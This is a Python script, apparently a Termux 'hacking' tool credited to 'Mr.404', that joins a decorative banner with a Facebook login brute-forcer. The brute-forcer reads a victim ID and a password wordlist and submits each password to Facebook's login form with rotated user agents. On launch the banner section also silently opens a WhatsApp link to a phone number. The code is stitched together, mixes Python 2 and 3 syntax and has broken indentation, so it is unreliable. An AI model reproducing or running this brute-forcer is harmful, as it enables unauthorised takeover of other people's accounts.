#-*-coding:utf8;-*-
#qpy:3
#qpy:console
import sys
import os
def hora():
       os.system('date +%r')
os.system("termux-open-url https://wa.me/6282331072836/?text=Assalamualaikum+bang+hacker+MR.404")
autor = "\033[95mAUTOR :\033[0m Mr.404"
version = "\033[95mVERSIÓN :\033[0m 3.1.2 "
def limpiar():
   os.system('clear')
def menu():
      print("""\033[96;1m
 \t   _______    __ _____  _______ __
 \t  / __/ _ )  / // / _ |/ ___/ //_/
 \t / _// _  | / _  / __ / /__/ ,<
\t/_/ /____/ /_//_/_/ |_\___/_/|_|\033[97m
                           ..:::::::::..
                      ..:::aad8888888baa:::..
                   .::::d:?88888888888?::8b::::.
                 .:::d8888:?88888888??a888888b:::.
               .:::d8888888a8888888aa8888888888b:::.
              ::::dP::::::::88888888888::::::::Yb::::
             ::::dP:::::::::Y888888888P:::::::::Yb::::
            ::::d8:::::::::::Y8888888P:::::::::::8b::::
           .::::88::::::::::::Y88888P::::::::::::88::::.
           :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
           :::::::Y88888888888P::|::Y88888888888P:::::::
           ::::::::::::::::888:::|:::888::::::::::::::::
            :::::::::::::::8888888888888b::::::::::::::
            :::::::::::::::88888888888888::::::::::::::
             :::::::::::::d88888888888888:::::::::::::
              ::::::::::::88::88::88:::88::::::::::::
                ::::::::::88::88::88:::88::::::::::
                  ::::::::88::88::P::::88::::::::
                    ::::::88::88:::::::88::::::
                        :::::::::::::::::::
                             :::::::::
""")
limpiar()
print(autor)
print(version)
menu()
hora()

#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random

email = str(raw_input(" \nID or number ====}>  " ))

passwordslist = str(raw_input(" \nPasswords List ====}> : "))

#login
login = 'https://www.facebook.com/login.php?login_attempt=1'
#agente
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        iniciar()
        contra()
        hora()
        print "  Hackeo Finalizado"
        print " Fin de la lista de Contraseñas"

def brute(password):
        sys.stdout.write("\r[+]\033[97;1m Hack..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
     	if log != login and (not 'login_attempt' in log):
                print("--- La Contraseña Es : {}".format(password))
                yo = raw_input("Contraseña Encontrada!!.")
                if yo == 'y':
                    exit()
                elif yo == 'n':
                       exit()


def contra():
        global password
        passwords = open(passwordslist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)
def iniciar():
        total = open(passwordslist,"r")
        total = total.readlines()
        hora()
        print("\nID VÍCTIMA :\033[90m {}".format(email))
        print " \n\033[0m[___] Iniciando Hackeo Fb..."
if __name__ == '__main__':
        main()
